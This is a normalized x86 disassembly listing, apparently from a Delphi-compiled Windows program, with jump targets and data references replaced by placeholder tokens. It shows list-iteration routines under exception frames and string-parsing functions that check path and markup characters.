mov [ edx + 0xd4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf0 ] ecx
mov [ edx + 0xf4 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xf8 ] ecx
mov [ edx + 0xfc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x100 ] ecx
mov [ edx + 0x104 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xd8 ] ecx
mov [ edx + 0xdc ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x118 ] ecx
mov [ edx + 0x11c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x120 ] ecx
mov [ edx + 0x124 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x130 ] ecx
mov [ edx + 0x134 ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x128 ] ecx
mov [ edx + 0x12c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x138 ] ecx
mov [ edx + 0x13c ] ecx
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0xe0 ] ecx
mov [ edx + 0xe4 ] ecx
mov eax [ eax ]
xor edx edx
mov [ eax + 0xe8 ] edx
mov [ eax + 0xec ] edx
mov eax [ esi + 0x30 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_488900
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_48896c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488973
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_488410
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_48897c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_4889e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4889ef
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_488424
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4889f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488a5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488a66
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_488438
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488a6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488ad3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488ada
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_48844c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488ae0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push sub_488b8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488b96
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403434
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov [ ebp - 0x9 ] 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_488460
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_46d2d4
sub_488b9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488c25
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488c2c
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_488490
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
sub_488c38
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488c9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488ca6
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_4884b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488cac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488d18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488d1f
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_488528
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488d28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488d94
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488d9b
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_48853c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488da4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488e0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488e12
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_488550
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488e18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488e7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488e86
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_488564
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488e8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488ef8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488eff
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_488580
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488f08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488f78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488f7f
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_48859c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_488f88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_488ffc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489003
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov ecx edi
mov edx esi
call sub_4885c4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_48900c
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
jle r-xdata
pop ebx
retn
dec [ ebx + 0x3c ]
mov [ ebx + 0x38 ] 0x0
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_42c2c4
mov edx [ ebx + 0x30 ]
mov edx [ edx + 0x8 ]
dec edx
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_42c334
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_42c25c
xor eax eax
mov [ ebx + 0x34 ] eax
sub_489078
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_4890df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4890e6
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_4885f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4890ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_488648
xor eax eax
push ebp
push sub_489153
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_489070
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48915a
mov eax [ ebp - 0x4 ]
call sub_48900c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_48905c
mov edx esi
call sub_48860c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_489160
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_489185
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48918c
retn
sub_4891e8
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_4042f8
cmp edi eax
jg r-xdata
mov eax esi
call sub_4042f8
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40c38c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_4042f8
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_4042f8
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40c38c
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_4042f8
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_4042f8
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c38c
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c38c
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_48933c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_4042f8
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_4891e8
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_4893b8
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_4893d8
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4895e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_40408c
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_48933c
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_4042f8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4042f8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4895e9
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_40405c
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_404558
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_4893b8
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_404220
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_4042f8
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_404558
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4043b8
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404558
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_4893b8
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404220
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_4042f8
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_404558
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4043b8
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_4042f8
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4891e8
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_404220
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_404344
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4891e8
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_404220
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404300
sub_4895f4
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_4042f8
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or ebp 0xffffffff
or edi 0xffffffff
mov eax esi
call sub_4042f8
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
test ebp ebp
jge r-xdata
test edi edi
jge r-xdata
mov eax esi
call sub_4042f8
sub eax 0x4
cmp ebx eax
jl r-xdata
mov edi ebx
mov ebp ebx
jmp r-xdata
test edi edi
jle r-xdata
mov edi ebp
test edi edi
jl r-xdata
mov eax esi
call sub_4042f8
cmp edi eax
je r-xdata
mov edx ebx
mov eax esi
call sub_4891e8
cmp al 0x6
jne r-xdata
mov al [ esi + edi ]
cmp al [ rw-data ]
sete al
xor al 0x1
mov [ esp ] al
sub_489678
push ebx
push esi
mov esi eax
mov bl [ rw-data ]
mov eax esi
call sub_4042f8
cmp eax 0x4
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4042f8
mov edx eax
dec edx
mov eax esi
call sub_4891e8
cmp al 0x6
jne r-xdata
mov eax esi
call sub_4042f8
mov edx eax
sub edx 0x2
mov eax esi
call sub_4891e8
cmp al 0x6
je r-xdata
mov eax esi
call sub_4042f8
mov bl [ esi + eax - 0x1 ]
mov eax esi
call sub_4042f8
mov edx eax
sub edx 0x3
mov eax esi
call sub_4891e8
cmp al 0x6
jne r-xdata
sub_4896e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_489761
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404038
mov esi ebx
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489768
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov ebx 0x1
inc ebx
dec esi
jne r-xdata
add al 0xfd
sub al 0x2
jb r-xdata
mov edx ebx
mov eax edi
call sub_4891e8
sub al 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
mov dl [ edi + ebx - 0x1 ]
call sub_404220
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404300
mov eax [ ebp - 0x4 ]
sub_489770
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4897b5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4896e4
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4897bc
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4897c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax edi
call sub_4042f8
mov edx eax
mov eax edi
call sub_489770
cmp eax ebx
jge r-xdata
xor ebp ebp
mov [ esp ] ebx
mov eax edi
call sub_4042f8
mov ebx eax
test ebx ebx
jle r-xdata
or ebp 0xffffffff
jmp r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
inc esi
dec ebx
jne r-xdata
dec [ esp ]
cmp [ esp ] 0x0
jl r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_4891e8
cmp al 0x3
je r-xdata
sub_489820
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4897c4
test eax eax
jl r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4891e8
dec eax
sub al 0x2
setb bl
sub_489848
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x14 ]
xor eax eax
push ebp
push j_sub_403a3c#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax esi
sub eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_48933c
mov [ ebp - 0x9 ] al
mov eax esi
dec eax
mov [ ebp - 0x10 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax ebx
mov edx edi
call sub_40408c
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_48933c
mov [ ebp - 0x9 ] al
test [ ebp - 0x9 ] 0x1
je r-xdata
push ebx
mov ecx [ ebp - 0x10 ]
mov edx 0x1
mov eax edi
call sub_404558
sub esi [ ebp - 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax edi
call sub_4042f8
mov ecx eax
mov edx esi
mov eax edi
call sub_404558
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404558
mov edx [ ebp - 0x28 ]
mov eax ebx
pop ecx
call sub_404344
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4042f8
mov ecx eax
mov edx esi
sub edx [ ebp + 0x10 ]
mov eax edi
call sub_404558
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x8 ]
dec ecx
mov edx 0x1
mov eax edi
call sub_404558
mov edx [ ebp - 0x20 ]
mov eax ebx
pop ecx
call sub_404344
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax edi
call sub_4042f8
mov ecx eax
mov edx [ ebp - 0x10 ]
inc edx
mov eax edi
call sub_404558
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_404300
jmp r-xdata
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4899d4
lea eax [ ebp - 0x28 ]
mov edx 0x6
call sub_40405c
retn
lea eax [ ebp - 0x14 ]
mov dl [ ebp + 0xc ]
call sub_404220
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_404300
dec esi
